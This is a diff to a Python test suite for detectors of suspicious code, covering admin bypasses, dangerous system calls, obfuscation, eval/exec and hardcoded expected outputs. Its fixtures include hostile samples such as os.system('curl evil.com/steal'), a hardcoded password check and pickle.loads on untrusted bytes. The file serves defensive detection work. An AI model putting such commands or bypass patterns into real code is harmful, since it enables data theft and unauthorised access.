@@ -30,25 +30,25 @@ class TestHardcodedAdminBypass:
     def test_detects_is_admin_assignment(self) -> None:
         code = "is_admin = True\nif is_admin:\n    grant_access()"
         sig = detect_hardcoded_admin_bypass(code)
-        assert sig is not None
-        assert sig.name == "hardcoded_admin_bypass"
-        assert sig.severity >= 0.5
+        assert len(sig) > 0
+        assert sig[0].name == "hardcoded_admin_bypass"
+        assert sig[0].severity >= 0.5
 
     def test_detects_admin_user_check(self) -> None:
         code = 'if user == "admin":'
         sig = detect_hardcoded_admin_bypass(code)
-        assert sig is not None
+        assert len(sig) > 0
 
     def test_detects_hardcoded_password(self) -> None:
         code = 'if password == "supersecret123":'
         sig = detect_hardcoded_admin_bypass(code)
-        assert sig is not None
+        assert len(sig) > 0
 
     def test_clean_code_no_signal(self) -> None:
         code = """def login(username, password):
     return authenticate(username, password)"""
         sig = detect_hardcoded_admin_bypass(code)
-        assert sig is None
+        assert len(sig) == 0
 
 
 # ---------------------------------------------------------------------------
@@ -60,28 +60,28 @@ class TestDangerousSystemCalls:
     def test_detects_subprocess_popen(self) -> None:
         code = "import subprocess\nsubprocess.Popen(['ls', '-la'])"
         sig = detect_dangerous_system_calls(code)
-        assert sig is not None
-        assert sig.name == "dangerous_system_calls"
+        assert len(sig) > 0
+        assert sig[0].name == "dangerous_system_calls"
 
     def test_detects_os_system(self) -> None:
         code = 'import os\nos.system("curl evil.com/steal")'
         sig = detect_dangerous_system_calls(code)
-        assert sig is not None
+        assert len(sig) > 0
 
     def test_detects_ctypes(self) -> None:
         code = "import ctypes\nctypes.CDLL('libc.so.6')"
         sig = detect_dangerous_system_calls(code)
-        assert sig is not None
+        assert len(sig) > 0
 
     def test_detects_pickle_load(self) -> None:
         code = "import pickle\ndata = pickle.loads(untrusted_bytes)"
         sig = detect_dangerous_system_calls(code)
-        assert sig is not None
+        assert len(sig) > 0
 
     def test_clean_code_no_signal(self) -> None:
         code = "result = sum([1, 2, 3])\nprint(result)"
         sig = detect_dangerous_system_calls(code)
-        assert sig is None
+        assert len(sig) == 0
 
 
 # ---------------------------------------------------------------------------
@@ -93,23 +93,23 @@ class TestSuspiciousPatterns:
     def test_detects_base64_decode(self) -> None:
         code = 'import base64; base64.b64decode("c3VwZXJzZWNyZXQ=")'
         sig = detect_suspicious_patterns(code)
-        assert sig is not None
-        assert sig.name == "suspicious_patterns"
+        assert len(sig) > 0
+        assert sig[0].name == "suspicious_patterns"
 
     def test_detects_dunder_import(self) -> None:
         code = 'mod = __import__("os")'
         sig = detect_suspicious_patterns(code)
-        assert sig is not None
+        assert len(sig) > 0
 
     def test_detects_builtin_monkey_patch(self) -> None:
         code = "__builtins__.input = fake_input"
         sig = detect_suspicious_patterns(code)
-        assert sig is not None
+        assert len(sig) > 0
 
     def test_clean_code_no_signal(self) -> None:
         code = "import math\nprint(math.pi)"
         sig = detect_suspicious_patterns(code)
-        assert sig is None
+        assert len(sig) == 0
 
 
 # ---------------------------------------------------------------------------
@@ -121,24 +121,24 @@ class TestEvalExec:
     def test_detects_eval(self) -> None:
         code = 'result = eval("2 + 2")'
         sig = detect_eval_exec(code)
-        assert sig is not None
-        assert sig.name == "eval_exec_detection"
+        assert len(sig) > 0
+        assert sig[0].name == "eval_exec_detection"
 
     def test_detects_exec(self) -> None:
         code = 'exec("import os; os.system(\"ls\")")'
         sig = detect_eval_exec(code)
-        assert sig is not None
+        assert len(sig) > 0
 
     def test_clean_code_no_signal(self) -> None:
         code = "result = 2 + 2\nprint(result)"
         sig = detect_eval_exec(code)
-        assert sig is None
+        assert len(sig) == 0
 
     def test_variable_named_eval_no_signal(self) -> None:
         # A variable *named* eval but not calling it should not trigger.
         code = "eval = 42\nprint(eval)"
         sig = detect_eval_exec(code)
-        assert sig is None
+        assert len(sig) == 0
 
 
 # ---------------------------------------------------------------------------
@@ -150,18 +150,18 @@ class TestHardcodedExpectedOutput:
     def test_detects_expected_comment(self) -> None:
         code = "# expected: 42\nprint(compute_answer())"
         sig = detect_hardcoded_expected_output(code)
-        assert sig is not None
-        assert sig.name == "hardcoded_expected_output"
+        assert len(sig) > 0
+        assert sig[0].name == "hardcoded_expected_output"
 
     def test_detects_answer_variable(self) -> None:
         code = "EXPECTED_OUTPUT = 'flag{abc123}'\nprint(EXPECTED_OUTPUT)"
         sig = detect_hardcoded_expected_output(code)
-        assert sig is not None
+        assert len(sig) > 0
 
     def test_clean_code_no_signal(self) -> None:
         code = "result = compute()\nprint(result)"
         sig = detect_hardcoded_expected_output(code)
-        assert sig is None
+        assert len(sig) == 0
 
 
 # ---------------------------------------------------------------------------
